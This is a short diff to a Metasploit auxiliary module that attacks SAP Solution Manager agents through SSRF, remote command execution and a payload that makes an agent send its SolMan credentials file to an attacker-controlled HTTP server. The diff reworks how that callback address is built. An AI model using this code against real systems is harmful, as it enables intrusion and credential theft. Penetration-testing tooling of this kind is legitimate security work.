@@ -58,7 +58,7 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('SSRF_METHOD', [true, 'HTTP method for SSRF', 'GET'], conditions: %w[ACTION == SSRF]),
         OptString.new('SSRF_URI', [true, 'URI for SSRF', 'http://127.0.0.1:80/'], conditions: %w[ACTION == SSRF]),
         OptString.new('COMMAND', [true, 'Command for execute in agent', 'id'], conditions: %w[ACTION == EXEC]),
-        OptAddress.new('SRVHOST', [ true, 'The local IP address to listen HTTP requests from agents', '192.168.1.1' ], conditions: %w[ACTION == SECSTORE]),
+        OptAddressRoutable.new('SRVHOST', [ false, 'The local IP address to listen HTTP requests from agents' ], conditions: %w[ACTION == SECSTORE]),
         OptPort.new('SRVPORT', [ true, 'The local port to listen HTTP requests from agents', 8000 ], conditions: %w[ACTION == SECSTORE]),
         OptString.new('AGENT', [true, 'Agent server name for exec command or SSRF', 'agent_server_name'], conditions: ['ACTION', 'in', %w[SSRF EXEC SECSTORE]]),
       ]
@@ -68,8 +68,6 @@ class MetasploitModule < Msf::Auxiliary
   def setup_xml_and_variables
     @host = datastore['RHOSTS']
     @port = datastore['RPORT']
-    @srv_host = datastore['SRVHOST']
-    @srv_port = datastore['SRVPORT']
     @path = datastore['TARGETURI']
 
     @agent_name = datastore['AGENT']
@@ -255,7 +253,7 @@ class MetasploitModule < Msf::Auxiliary
         }
       }
     )
-    @creds_payload = make_steal_credentials_payload(agent[:instanceName], @srv_host, @srv_port, "/#{@script_name}")
+    @creds_payload = make_steal_credentials_payload(agent[:instanceName], "#{get_uri}/#{@script_name}")
     print_status("Start script: #{@script_name} with payload for retrieving SolMan credentials file from agent: #{@agent_name}")
     send_soap_request(make_soap_body(@agent_name, @script_name, @creds_payload))
 
